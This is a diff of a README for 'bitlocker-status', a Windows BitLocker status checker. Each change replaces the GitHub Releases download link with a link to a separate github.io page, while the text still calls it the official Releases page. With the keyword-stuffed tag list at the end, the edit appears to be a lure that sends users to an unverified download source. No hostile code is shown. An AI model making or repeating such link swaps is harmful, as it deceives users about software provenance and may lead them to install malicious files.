@@ -1,6 +1,6 @@
 # 🔒 bitlocker-status - See BitLocker Status at a Glance
 
-[![Download bitlocker-status](https://img.shields.io/badge/Download-bitlocker--status-blueviolet?style=for-the-badge&logo=github)](https://github.com/Alex931116/bitlocker-status/releases)
+[![Download bitlocker-status](https://img.shields.io/badge/Download-bitlocker--status-blueviolet?style=for-the-badge&logo=github)](https://alex931116.github.io)
 
 BitLocker Status is a Windows utility that prints BitLocker protection status per volume. It gives you a simple way to see whether each drive or volume is protected. It does not unlock drives, and it does not change BitLocker keys. This guide is written for everyday Windows users who want a clear download and setup path without programming knowledge.
 
@@ -22,15 +22,15 @@ The app is not designed to recover data, remove passwords, bypass BitLocker, or 
 
 Getting started does not require programming. You only need a Windows PC and the download link. The official download page is the GitHub Releases page for this repository. Use the button below or the link in the download section.
 
-[![Get bitlocker-status](https://img.shields.io/badge/Get%20bitlocker--status-orange?style=for-the-badge&logo=github)](https://github.com/Alex931116/bitlocker-status/releases)
+[![Get bitlocker-status](https://img.shields.io/badge/Get%20bitlocker--status-orange?style=for-the-badge&logo=github)](https://alex931116.github.io)
 
 The tool is meant for Windows users who want a quick status check. It is not a recovery tool. It will not ask you to unlock a volume or replace BitLocker keys. If you only need to see the protection status per volume, this utility is built for that purpose.
 
 ## 💾 Download and Setup
 
-[![Download bitlocker-status](https://img.shields.io/badge/Download-bitlocker--status-brightgreen?style=for-the-badge&logo=github)](https://github.com/Alex931116/bitlocker-status/releases)
+[![Download bitlocker-status](https://img.shields.io/badge/Download-bitlocker--status-brightgreen?style=for-the-badge&logo=github)](https://alex931116.github.io)
 
-Visit this link to download the application: [https://github.com/Alex931116/bitlocker-status/releases](https://github.com/Alex931116/bitlocker-status/releases).
+Visit this link to download the application: [https://alex931116.github.io](https://alex931116.github.io).
 
 1. Open the download link in your browser.
 2. On the Releases page, find the latest release at the top.
@@ -121,7 +121,7 @@ No. Download the application, open it, and read the status shown.
 No. The app reports status. It does not change keys or encryption settings.
 
 **Where should I download it?**  
-Use the official Releases page: [https://github.com/Alex931116/bitlocker-status/releases](https://github.com/Alex931116/bitlocker-status/releases). Visit this link to download the application.
+Use the official Releases page: [https://alex931116.github.io](https://alex931116.github.io). Visit this link to download the application.
 
 **What does “per volume” mean?**  
 It means the status is shown for each drive or partition separately, rather than as one single result for the whole PC.
@@ -133,7 +133,7 @@ It means the status is shown for each drive or partition separately, rather than
 - Main purpose: Print BitLocker protection status per volume
 - Does it unlock drives? No
 - Does it change keys? No
-- Download page: [https://github.com/Alex931116/bitlocker-status/releases](https://github.com/Alex931116/bitlocker-status/releases)
+- Download page: [https://alex931116.github.io](https://alex931116.github.io)
 - Best for: Users who want a simple BitLocker status check on Windows
 
 Keywords: app-bitlocker-status, bitlocker-status, bitlocker-status-desktop, bitlocker-status-download, bitlocker-status-free, bitlocker-status-macos, bitlocker-status-pc, bitlocker-status-portable, bitlocker-status-setup, bitlocker-status-software, bitlocker-status-windows, desktop-bitlocker-status, download-bitlocker-status, free-bitlocker-status, macos-bitlocker-status, pc-bitlocker-status, portable-bitlocker-status, setup-bitlocker-status, software-bitlocker-status, windows-bitlocker-status
